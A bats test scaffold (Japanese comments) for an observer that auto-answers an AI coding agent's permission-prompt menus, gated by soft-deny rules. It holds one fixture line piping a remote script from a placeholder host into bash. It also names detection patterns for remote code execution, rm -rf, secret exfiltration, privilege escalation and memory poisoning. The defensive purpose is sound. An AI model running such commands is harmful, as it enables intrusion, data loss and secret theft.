#!/usr/bin/env bats
# ac-scaffold-tests-973.bats
#
# Issue #973: tech-debt: observer Auto レイヤーの permission UI menu 自動代理応答対応
#
# AC coverage:
#   AC1  - cld-observe-any emit_event に prompt_context / options フィールド追加
#   AC2  - intervene-auto.md に --pattern permission-ui-response 追加 + soft_deny_match.py 新設
#   AC3  - soft-deny-rules.md 新設（schema_version, 5 ルール, 必須フィールド）
#   AC5  - ドキュメント整合性（pitfalls-catalog, monitor-channel-catalog, intervention-catalog, observation-pattern-catalog）
#   AC6  - regex 正確性 verify（一致 4 件 + 不一致 3 件 + ANSI strip 1 件 + state=unknown fallback 1 件）
#   AC7  - ADR-014 3 層プロトコル整合性（soft_deny state tracking）
#   AC9  - deps.yaml 整合確認（cld-observe-any / intervene-auto.md / soft_deny_match.py）
#
# RED: 全テストは実装前に fail する

load 'helpers/common'

# ファイルパス変数（setup で初期化）
CLD_OBSERVE_ANY=""
INTERVENE_AUTO_MD=""
SOFT_DENY_MATCH_PY=""
SOFT_DENY_RULES_MD=""
PITFALLS_CATALOG=""
MONITOR_CATALOG=""
INTERVENTION_CATALOG=""
OBSERVATION_PATTERN_CATALOG=""
TWL_DEPS_YAML=""
SESSION_DEPS_YAML=""

setup() {
  common_setup

  local this_dir
  this_dir="$(cd "$(dirname "$BATS_TEST_FILENAME")" && pwd)"
  local tests_dir
  tests_dir="$(cd "${this_dir}/.." && pwd)"
  local repo_root
  repo_root="$(cd "${tests_dir}/.." && pwd)"

  CLD_OBSERVE_ANY="${repo_root}/../session/scripts/cld-observe-any"
  INTERVENE_AUTO_MD="${repo_root}/commands/intervene-auto.md"
  SOFT_DENY_MATCH_PY="${repo_root}/../../cli/twl/src/twl/intervention/soft_deny_match.py"
  SOFT_DENY_RULES_MD="${repo_root}/skills/su-observer/refs/soft-deny-rules.md"
  PITFALLS_CATALOG="${repo_root}/skills/su-observer/refs/pitfalls-catalog.md"
  MONITOR_CATALOG="${repo_root}/skills/su-observer/refs/monitor-channel-catalog.md"
  INTERVENTION_CATALOG="${repo_root}/refs/intervention-catalog.md"
  OBSERVATION_PATTERN_CATALOG="${repo_root}/refs/observation-pattern-catalog.md"
  TWL_DEPS_YAML="${repo_root}/deps.yaml"
  SESSION_DEPS_YAML="${repo_root}/../session/deps.yaml"

  export CLD_OBSERVE_ANY INTERVENE_AUTO_MD SOFT_DENY_MATCH_PY SOFT_DENY_RULES_MD
  export PITFALLS_CATALOG MONITOR_CATALOG INTERVENTION_CATALOG OBSERVATION_PATTERN_CATALOG
  export TWL_DEPS_YAML SESSION_DEPS_YAML
}

teardown() {
  common_teardown
}

# ===========================================================================
# AC1: cld-observe-any emit_event に prompt_context / options フィールド追加
# ===========================================================================

@test "ac1a: cld-observe-any が存在する" {
  # AC: 実装対象 plugins/session/scripts/cld-observe-any
  [ -f "${CLD_OBSERVE_ANY}" ]
}

@test "ac1b: cld-observe-any の emit_event が prompt_context フィールドを出力する" {
  # AC: emit_event 拡張 — prompt_context フィールドを追加
  # RED: 未実装のため grep fail
  [ -f "${CLD_OBSERVE_ANY}" ]
  run grep -qF 'prompt_context' "${CLD_OBSERVE_ANY}"
  assert_success
}

@test "ac1c: cld-observe-any の emit_event が options フィールドを出力する" {
  # AC: emit_event 拡張 — options フィールド（メニュー選択肢のリスト）を追加
  # RED: 未実装のため grep fail
  [ -f "${CLD_OBSERVE_ANY}" ]
  run grep -qF 'options' "${CLD_OBSERVE_ANY}"
  assert_success
}

@test "ac1d: cld-observe-any の PERMISSION-PROMPT 検知時に capture-pane -S -50 を実行する" {
  # AC: prompt_context = tmux capture-pane -t <win> -p -S -50 の strip_ansi 済み出力 (max 8KB)
  # RED: 未実装のため grep fail
  [ -f "${CLD_OBSERVE_ANY}" ]
  run grep -qE 'capture.pane.*-S.*-50|capture.pane.*-50.*PERMISSION' "${CLD_OBSERVE_ANY}"
  assert_success
}

@test "ac1e: cld-observe-any の prompt_context が 8KB に切り詰められる" {
  # AC: max 8KB（8192 バイト）制限
  # RED: 未実装のため grep fail
  [ -f "${CLD_OBSERVE_ANY}" ]
  run grep -qE '8192|8KB|8.*KB|head.*-c.*8|truncat.*8' "${CLD_OBSERVE_ANY}"
  assert_success
}

@test "ac1f: cld-observe-any の options 抽出が PERMISSION-PROMPT 検知行から行われる" {
  # AC: options = 検知行から抽出したメニュー選択肢（例: ["1. Yes, proceed", "2. No, and tell ...", ...]）
  # RED: 未実装のため grep fail
  [ -f "${CLD_OBSERVE_ANY}" ]
  run grep -qE 'options.*extract|extract.*options|menu.*option|option.*menu|grep.*Yes.*proceed|Yes.*proceed.*option' "${CLD_OBSERVE_ANY}"
  assert_success
}

@test "ac1g: cld-observe-any の既存フィールド（event/window/timestamp 等）が保持されている" {
  # AC: 既存 /tmp/claude-notifications/ 互換性を維持（既存 fields の削除禁止）
  # verified: 実装対象行 L207-256 を静的 grep で確認
  [ -f "${CLD_OBSERVE_ANY}" ]
  run grep -qF '"event"' "${CLD_OBSERVE_ANY}"
  assert_success
  run grep -qF '"window"' "${CLD_OBSERVE_ANY}"
  assert_success
  run grep -qF '"timestamp"' "${CLD_OBSERVE_ANY}"
  assert_success
}

@test "ac1h: cld-observe-any の --event-dir 出力 json に prompt_context が含まれる（PERMISSION-PROMPT 時）" {
  # AC: --event-dir 出力 json にも prompt_context フィールドを追加（既存 json 構造を拡張）
  # RED: 未実装のため grep fail
  [ -f "${CLD_OBSERVE_ANY}" ]
  # EVENT_DIR 書き出し部分（emit_event の後半ブロック）に prompt_context が含まれること
  run bash -c "awk '/emit_event\(\)/,/^emit_event/' '${CLD_OBSERVE_ANY}' | grep -qF 'prompt_context'"
  assert_success
}

# ===========================================================================
# AC2: intervene-auto.md に --pattern permission-ui-response + soft_deny_match.py 新設
# ===========================================================================

@test "ac2a: intervene-auto.md に --pattern 引数として permission-ui-response が追加されている" {
  # AC: --pattern permission-ui-response を追加
  # RED: 未実装のため grep fail
  [ -f "${INTERVENE_AUTO_MD}" ]
  run grep -qF 'permission-ui-response' "${INTERVENE_AUTO_MD}"
  assert_success
}

@test "ac2b: intervene-auto.md に soft_deny_match 呼び出しが記述されている" {
  # AC: python3 -m twl.intervention.soft_deny_match 呼び出し
  # RED: 未実装のため grep fail
  [ -f "${INTERVENE_AUTO_MD}" ]
  run grep -qE 'soft_deny_match|twl\.intervention' "${INTERVENE_AUTO_MD}"
  assert_success
}

@test "ac2c: soft_deny_match.py が cli/twl/src/twl/intervention/ に新設されている" {
  # AC: cli/twl/intervention/soft_deny_match.py 新設
  # RED: ファイルが未作成のため fail
  [ -f "${SOFT_DENY_MATCH_PY}" ]
}

@test "ac2d: soft_deny_match.py が __main__ エントリポイントを持つ（python3 -m で実行可能）" {
  # AC: python3 -m twl.intervention.soft_deny_match として実行できる
  # RED: soft_deny_match.py が未実装のため fail
  [ -f "${SOFT_DENY_MATCH_PY}" ]
  run grep -qE '__main__|if __name__.*__main__' "${SOFT_DENY_MATCH_PY}"
  assert_success
}

@test "ac2e: intervene-auto.md の no-match 分岐で session-comm.sh inject 1 が呼ばれる" {
  # AC: no-match → session-comm.sh inject $WIN "1" --force で Layer 0 Auto 承認
  # RED: 未実装のため grep fail
  [ -f "${INTERVENE_AUTO_MD}" ]
  run grep -qE 'inject.*"1"|inject.*1.*--force|session.comm.*inject' "${INTERVENE_AUTO_MD}"
  assert_success
}

@test "ac2f: intervene-auto.md の全分岐で InterventionRecord が .observation/ に記録される" {
  # AC: 全分岐（no-match / match-confirm / match-escalate）で InterventionRecord を記録
  # RED: 未実装のため grep fail
  [ -f "${INTERVENE_AUTO_MD}" ]
  run grep -qE '\.observation|InterventionRecord' "${INTERVENE_AUTO_MD}"
  assert_success
}

# ===========================================================================
# AC3: soft-deny-rules.md 新設
# ===========================================================================

@test "ac3a: soft-deny-rules.md が plugins/twl/skills/su-observer/refs/ に存在する" {
  # AC: plugins/twl/skills/su-observer/refs/soft-deny-rules.md 新設
  # RED: ファイルが未作成のため fail
  [ -f "${SOFT_DENY_RULES_MD}" ]
}

@test "ac3b: soft-deny-rules.md に schema_version: 1 が含まれる" {
  # AC: 冒頭に schema_version: 1 必須
  # RED: ファイルが未作成のため fail
  [ -f "${SOFT_DENY_RULES_MD}" ]
  run grep -qF 'schema_version: 1' "${SOFT_DENY_RULES_MD}"
  assert_success
}

@test "ac3c: soft-deny-rules.md に code-from-external ルールがある（layer: confirm）" {
  # AC: code-from-external (layer: confirm) — curl|wget ... | bash
  # RED: ファイルが未作成のため fail
  [ -f "${SOFT_DENY_RULES_MD}" ]
  run grep -qF 'code-from-external' "${SOFT_DENY_RULES_MD}"
  assert_success
}

@test "ac3d: soft-deny-rules.md に irreversible-local-destruction ルールがある（layer: confirm）" {
  # AC: irreversible-local-destruction (layer: confirm) — rm -rf ...
  # RED: ファイルが未作成のため fail
  [ -f "${SOFT_DENY_RULES_MD}" ]
  run grep -qF 'irreversible-local-destruction' "${SOFT_DENY_RULES_MD}"
  assert_success
}

@test "ac3e: soft-deny-rules.md に memory-poisoning ルールがある（layer: confirm）" {
  # AC: memory-poisoning (layer: confirm) — doobidoo delete / MEMORY.md > / memory_delete
  # RED: ファイルが未作成のため fail
  [ -f "${SOFT_DENY_RULES_MD}" ]
  run grep -qF 'memory-poisoning' "${SOFT_DENY_RULES_MD}"
  assert_success
}

@test "ac3f: soft-deny-rules.md に secret-exfiltration ルールがある（layer: confirm）" {
  # AC: secret-exfiltration (layer: confirm) — .env / .ssh / API_KEY= / SECRET= etc
  # RED: ファイルが未作成のため fail
  [ -f "${SOFT_DENY_RULES_MD}" ]
  run grep -qF 'secret-exfiltration' "${SOFT_DENY_RULES_MD}"
  assert_success
}

@test "ac3g: soft-deny-rules.md に privilege-escalation ルールがある（layer: escalate）" {
  # AC: privilege-escalation (layer: escalate) — sudo | chmod +s | setcap
  # RED: ファイルが未作成のため fail
  [ -f "${SOFT_DENY_RULES_MD}" ]
  run grep -qF 'privilege-escalation' "${SOFT_DENY_RULES_MD}"
  assert_success
}

@test "ac3h: soft-deny-rules.md の各ルールに id/regex/layer/rationale フィールドがある" {
  # AC: 各 rule: id / regex / layer / rationale フィールド必須
  # RED: ファイルが未作成のため fail
  [ -f "${SOFT_DENY_RULES_MD}" ]
  run grep -qF 'id:' "${SOFT_DENY_RULES_MD}"
  assert_success
  run grep -qF 'regex:' "${SOFT_DENY_RULES_MD}"
  assert_success
  run grep -qF 'layer:' "${SOFT_DENY_RULES_MD}"
  assert_success
  run grep -qF 'rationale:' "${SOFT_DENY_RULES_MD}"
  assert_success
}

@test "ac3i: soft-deny-rules.md の code-from-external regex が curl|wget ... | bash に一致する" {
  # AC: regex — (curl|wget)\s+(-[a-zA-Z]+\s+)*https?://.*\.sh\s*\|\s*(bash|sh|sudo)
  # RED: ファイルが未作成のため fail
  [ -f "${SOFT_DENY_RULES_MD}" ]
  run grep -qE 'curl.*wget|wget.*curl' "${SOFT_DENY_RULES_MD}"
  assert_success
  run grep -qE 'bash|sh\b' "${SOFT_DENY_RULES_MD}"
  assert_success
}

@test "ac3j: soft-deny-rules.md の privilege-escalation regex が sudo を含む" {
  # AC: regex — (sudo |chmod\s+\+s|setcap )
  # RED: ファイルが未作成のため fail
  [ -f "${SOFT_DENY_RULES_MD}" ]
  run grep -qF 'sudo' "${SOFT_DENY_RULES_MD}"
  assert_success
}

# ===========================================================================
# AC5: ドキュメント整合性
# ===========================================================================

@test "ac5a: pitfalls-catalog.md §4.7 に permission-ui-response 自動代理応答への言及がある" {
  # AC: pitfalls-catalog.md §4.7 更新
  # RED: 更新が未完了のため grep fail
  [ -f "${PITFALLS_CATALOG}" ]
  run grep -qE 'permission.ui.response|soft_deny_match|auto.*代理|代理.*応答' "${PITFALLS_CATALOG}"
  assert_success
}

@test "ac5b: monitor-channel-catalog.md の PERMISSION-PROMPT エントリが Auto 層を参照している" {
  # AC: monitor-channel-catalog.md L18/L516/L446-462 更新
  # PERMISSION-PROMPT チャネルの介入層が Auto（または Auto/Confirm 分岐）に更新されること
  # RED: 更新が未完了のため grep fail
  [ -f "${MONITOR_CATALOG}" ]
  run grep -qE 'PERMISSION-PROMPT.*Auto|Auto.*PERMISSION-PROMPT|permission.ui.response' "${MONITOR_CATALOG}"
  assert_success
}

@test "ac5c: intervention-catalog.md にパターン 14（permission-ui-response）が追加されている" {
  # AC: intervention-catalog.md パターン 14 追加
  # RED: 更新が未完了のため grep fail
  [ -f "${INTERVENTION_CATALOG}" ]
  run grep -qE 'パターン 14|pattern.*14|14.*permission.ui.response|permission-ui-response' "${INTERVENTION_CATALOG}"
  assert_success
}

@test "ac5d: observation-pattern-catalog.md に permission-ui-response sub-pattern が追加されている" {
  # AC: observation-pattern-catalog.md sub-pattern 追加
  # RED: 更新が未完了のため grep fail
  [ -f "${OBSERVATION_PATTERN_CATALOG}" ]
  run grep -qE 'permission.ui.response|soft_deny|permission.*ui.*response' "${OBSERVATION_PATTERN_CATALOG}"
  assert_success
}

# ===========================================================================
# AC6: regex 正確性 verify
# ===========================================================================

@test "ac6-match-1: regex が '1. Yes, proceed' に一致する" {
  # AC: regex = ^([1-9]\. (Yes, proceed|Yes, and allow|No, and tell)|Interrupted by user)
  # 一致ケース 1
  local line="1. Yes, proceed"
  run bash -c "echo '${line}' | grep -qE '^([1-9]\. (Yes, proceed|Yes, and allow|No, and tell)|Interrupted by user)'"
  assert_success
}

@test "ac6-match-2: regex が '2. No, and tell Claude what to do differently' に一致する" {
  # 一致ケース 2
  local line="2. No, and tell Claude what to do differently"
  run bash -c "echo '${line}' | grep -qE '^([1-9]\. (Yes, proceed|Yes, and allow|No, and tell)|Interrupted by user)'"
  assert_success
}

@test "ac6-match-3: regex が '3. Yes, and allow always' に一致する" {
  # 一致ケース 3
  local line="3. Yes, and allow always"
  run bash -c "echo '${line}' | grep -qE '^([1-9]\. (Yes, proceed|Yes, and allow|No, and tell)|Interrupted by user)'"
  assert_success
}

@test "ac6-match-4: regex が 'Interrupted by user' に一致する" {
  # 一致ケース 4
  local line="Interrupted by user"
  run bash -c "echo '${line}' | grep -qE '^([1-9]\. (Yes, proceed|Yes, and allow|No, and tell)|Interrupted by user)'"
  assert_success
}

@test "ac6-no-match-1: regex が 'Allow this action?' に一致しない（false positive 防止）" {
  # 不一致ケース 1: prompt 見出し行
  local line="Allow this action?"
  run bash -c "echo '${line}' | grep -qE '^([1-9]\. (Yes, proceed|Yes, and allow|No, and tell)|Interrupted by user)'"
  assert_failure
}

@test "ac6-no-match-2: regex が 'command: curl http://...' に一致しない（false positive 防止）" {
  # 不一致ケース 2: fixture の command 行
  local line="command: curl http://x.example.com/install.sh | bash"
  run bash -c "echo '${line}' | grep -qE '^([1-9]\. (Yes, proceed|Yes, and allow|No, and tell)|Interrupted by user)'"
  assert_failure
}

@test "ac6-no-match-3: regex が '10. Some option' に一致しない（[1-9] は 1 桁のみ）" {
  # 不一致ケース 3: 2桁の番号は一致しない
  local line="10. Some option"
  run bash -c "echo '${line}' | grep -qE '^([1-9]\. (Yes, proceed|Yes, and allow|No, and tell)|Interrupted by user)'"
  assert_failure
}

@test "ac6-ansi-strip: ANSI エスケープシーケンス付き入力から regex が正しく一致する" {
  # ANSI strip 負荷試験: ANSI コードを除去後に regex 適用
  # cld-observe-any の strip_ansi を経由した後の行に一致することを確認
  # strip_ansi は sed 's/\x1b\[[0-9;]*m//g' 等で実装される想定
  local line_with_ansi
  # ESC[32m ... ESC[0m で囲まれた "1. Yes, proceed" を strip_ansi した結果
  line_with_ansi=$(printf '\033[32m1. Yes, proceed\033[0m')
  local stripped
  stripped=$(printf '%s' "${line_with_ansi}" | sed 's/\x1b\[[0-9;]*[mK]//g')
  run bash -c "echo '${stripped}' | grep -qE '^([1-9]\. (Yes, proceed|Yes, and allow|No, and tell)|Interrupted by user)'"
  assert_success
}

@test "ac6-fallback: state=unknown フォールバック時に --force 付与で inject が実行される" {
  # AC: state=unknown フォールバック: --force 付与時の動作を bats 1 件検証
  # state が不明な場合でも --force オプションで inject が実行されること
  # RED: intervene-auto.md の permission-ui-response パターンが未記述のため grep fail
  [ -f "${INTERVENE_AUTO_MD}" ]
  run grep -qE 'state.*unknown|unknown.*state|force.*inject|inject.*force|--force' "${INTERVENE_AUTO_MD}"
  assert_success
}

# ===========================================================================
# AC7: ADR-014 3 層プロトコル整合性
# ===========================================================================

@test "ac7a: soft_deny_match.py が .observation/<session-id>/soft-deny-counter.json を更新する" {
  # AC: soft_deny state tracking (.observation/<session-id>/soft-deny-counter.json)
  # RED: soft_deny_match.py が未実装のため fail
  [ -f "${SOFT_DENY_MATCH_PY}" ]
  run grep -qE 'soft.deny.counter|counter.*json|deny.*counter|observation.*counter' "${SOFT_DENY_MATCH_PY}"
  assert_success
}

@test "ac7b: intervene-auto.md に連続 soft_deny 検知時の STOP 動作が記述されている" {
  # AC: 連続 soft_deny 検知時の STOP 動作
  # RED: permission-ui-response パターンが未記述のため grep fail
  [ -f "${INTERVENE_AUTO_MD}" ]
  run grep -qE 'soft.deny|soft_deny|連続.*deny|deny.*連続' "${INTERVENE_AUTO_MD}"
  assert_success
}

@test "ac7c: intervene-auto.md に ADR-014 3 層プロトコルへの参照がある" {
  # AC: ADR-014 3 層プロトコル整合性 verify
  # RED: permission-ui-response パターンが未記述のため grep fail
  [ -f "${INTERVENE_AUTO_MD}" ]
  run grep -qE 'ADR.014|Layer.*0.*Auto|Layer.*1.*Confirm|Layer.*2.*Escalate' "${INTERVENE_AUTO_MD}"
  assert_success
}

# ===========================================================================
# AC9: cross-plugin deps.yaml 整合確認
# ===========================================================================

@test "ac9a: plugins/twl/deps.yaml に cld-observe-any への依存が明示されている" {
  # AC: plugins/twl/deps.yaml で cld-observe-any への依存を明示
  # RED: 依存が未記載のため grep fail
  [ -f "${TWL_DEPS_YAML}" ]
  run grep -qF 'cld-observe-any' "${TWL_DEPS_YAML}"
  assert_success
}

@test "ac9b: plugins/session/deps.yaml に intervene-auto.md への依存が明示されている" {
  # AC: plugins/session/deps.yaml で intervene-auto.md への依存を明示
  # RED: 依存が未記載のため grep fail
  [ -f "${SESSION_DEPS_YAML}" ]
  run grep -qF 'intervene-auto' "${SESSION_DEPS_YAML}"
  assert_success
}

@test "ac9c: plugins/session/deps.yaml に soft_deny_match.py への依存が明示されている" {
  # AC: plugins/session/deps.yaml で soft_deny_match.py への依存を明示
  # RED: 依存が未記載のため grep fail
  [ -f "${SESSION_DEPS_YAML}" ]
  run grep -qE 'soft_deny_match|soft-deny-match' "${SESSION_DEPS_YAML}"
  assert_success
}

@test "ac9d: cli/twl/src/twl/intervention/__init__.py が存在する（パッケージ宣言）" {
  # AC: soft_deny_match.py の親パッケージ intervention/ に __init__.py が必要
  # RED: 未作成のため fail
  local init_py
  init_py="$(dirname "${SOFT_DENY_MATCH_PY}")/__init__.py"
  [ -f "${init_py}" ]
}
